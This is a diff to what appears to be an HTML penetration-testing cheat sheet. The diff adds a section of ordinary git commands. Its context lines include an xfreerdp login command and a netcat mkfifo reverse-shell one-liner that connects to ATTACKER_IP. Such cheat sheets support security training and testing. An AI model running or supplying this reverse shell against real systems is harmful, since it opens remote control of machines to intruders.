@@ -49,6 +49,7 @@ Topic contains:
         <li> <a href='#n1.18'>Meterpreter</a>
 	<li> <a href='#n1.19'>CMD (Windows)</a>
         <li> <a href='#n1.20'>Reverse shell</a>
+	<li> <a href='#n1.21'>Git</a>
 		
 <h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
@@ -519,6 +520,16 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	<ol>
 		<li> <pre><code> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;ATTACKER_IP> &lt;ATTACKER_PORT> >/tmp/f </code></pre>
   	</ol>
+   
+<h3 id='n1.21'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Git</ins></h3>
+	<ol>
+		<li> <code>git log</code> - show commits` history
+		<li> <code>git diff</code> - show difference between commits
+		<li> <code>git blame</code> - who and when changed line in file
+		<li> <code>git checkout</code> - change commit or branch
+		<li> <code>git branch</code> - show branches
+		<li> <code>git tag</code> - show all tags in the repo
+ 	</ol>
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
    
